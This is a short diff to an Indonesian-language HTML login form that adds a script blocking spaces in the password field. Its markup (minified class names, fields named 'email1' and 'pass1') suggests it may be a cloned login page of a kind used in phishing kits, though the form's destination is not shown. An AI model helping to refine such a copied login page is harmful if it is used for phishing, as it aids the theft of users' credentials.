@@ -34,11 +34,18 @@
 		<input type="hidden" name="unrecognized_tries" value="0" />
 	<ul class="bf bg bh">
 	<li class="bg">
+<script>
+		function checkForSpaces(event) {
+			if (event.keyCode == 32) {
+				event.preventDefault();
+			}
+		}
+	</script>
 		<h3 class="bi bj bk">Email atau Telepon</h3>
 		<input autocorrect="off" autocapitalize="off" class="bl bm bn" name="email1" value="" type="text" /></li>
 		<li class="bg"><div>
 		<h3 class="bi bj bk">Kata Sandi</h3>
-		<input autocorrect="off" autocapitalize="off" class="bl bm bo bp" name="pass1" type="password" minlength="6" maxlength="12" pattern="^(?!.*\s).*$" placeholder="Password" /></div></li>
+		<input autocorrect="off" autocapitalize="off" class="bl bm bo bp" name="pass1" type="password" onkeypress="checkForSpaces(event)" minlength="6" maxlength="12" pattern="^(?!.*\s).*$" placeholder="Password" /></div></li>
 		<li class="bg">
 		<input value="Masuk" type="submit" name="login" class="o n p bq br bs" /></li></ul>
 	<div></div>
